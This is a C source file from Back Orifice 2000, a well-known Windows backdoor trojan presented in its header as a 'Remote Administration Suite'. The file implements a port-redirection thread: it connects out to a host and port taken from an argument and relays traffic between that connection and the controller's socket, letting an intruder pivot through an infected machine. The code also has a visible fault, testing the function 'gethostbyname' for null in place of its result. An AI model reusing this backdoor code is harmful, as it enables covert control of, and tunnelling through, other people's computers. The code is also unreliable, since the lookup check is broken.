/*  Back Orifice 2000 - Remote Administration Suite
    Copyright (C) 1999, Cult Of The Dead Cow

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

	The author of this program may be contacted at dildog@l0pht.com. */

#include<windows.h>
#include<auth.h>
#include<iohandler.h>
#include<cmd\cmd_tcpip.h>

//typedef struct __port_child_param {
//	SOCKET s;
//	SOCKADDR_IN saddr;
//	BOOL *pbDone;
//	int nArg1;
//	char *svArg2;
//	char *svArg3;
//} PORT_CHILD_PARAM;


DWORD WINAPI PortRedirThread(LPVOID lpParameter)
{
	PORT_CHILD_PARAM *ppcp=(PORT_CHILD_PARAM *) lpParameter;
	
	// Get remote address
	int i,nPort;
	char svAddress[256];
	lstrcpyn(svAddress,ppcp->svArg2,256);
	for(i=0;i<256;i++) {
		if(svAddress[i]==':') {
			svAddress[i]='\0';
			nPort=atoi(&svAddress[i+1]);
			break;
		}
	}

	// Put into SOCKADDR_IN structure
	SOCKADDR_IN saddr;
	struct hostent *he;
	DWORD dwIPAddr;

	dwIPAddr=inet_addr(svAddress);
	if(dwIPAddr==INADDR_NONE) {
		he=gethostbyname(svAddress);
		if(gethostbyname==NULL) {
			free(ppcp);
			return 1;
		}
		dwIPAddr=*(DWORD *)he->h_addr_list[0];
	}

	memset(&saddr,0,sizeof(SOCKADDR_IN));
	saddr.sin_family=AF_INET;
	saddr.sin_port=htons(nPort);
	saddr.sin_addr.s_addr=dwIPAddr;
	
	// Create socket

	SOCKET s;
	s=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(s==INVALID_SOCKET) {
		free(ppcp);
		return 1;
	}

	// Connect to remote port

	if(connect(s,(SOCKADDR *)&saddr,sizeof(SOCKADDR_IN))==SOCKET_ERROR) {
		closesocket(s);
		free(ppcp);
		return 1;
	}

	// Nonblocking mode
	DWORD dwBlock=1;
	ioctlsocket(s, FIONBIO, &dwBlock);

	// Now we sit around and forward packets.
	
	DWORD dwLen;
	fd_set rfds;
	while(!*(ppcp->pbDone)) {
		// Give up time
		Sleep(20);

		FD_ZERO(&rfds);
		FD_SET(s,&rfds);
		FD_SET(ppcp->s,&rfds);
		TIMEVAL tm;
		tm.tv_sec=0;
		tm.tv_usec=0;
		if(select(0,&rfds,NULL,NULL,&tm)>0) {		
			if(FD_ISSET(s,&rfds)) {
				ioctlsocket(s,FIONREAD,&dwLen);
				if(dwLen<=0) break;
				char *buffer=(char *)malloc(dwLen);
				if(buffer!=NULL) {
					dwLen=recv(s,buffer,dwLen,0);
					if(dwLen>0) send(ppcp->s,buffer,dwLen,0);
					free(buffer);
				}
			}	
			if(FD_ISSET(ppcp->s,&rfds)) {
				ioctlsocket(ppcp->s,FIONREAD,&dwLen);
				if(dwLen<=0) break;
				char *buffer=(char *)malloc(dwLen);
				if(buffer!=NULL) {
					dwLen=recv(ppcp->s,buffer,dwLen,0);
					if(dwLen>0) send(s,buffer,dwLen,0);
					free(buffer);
				}
			}	
		}
	}

	closesocket(s);
	closesocket(ppcp->s);
	free(ppcp);
	return 0;
}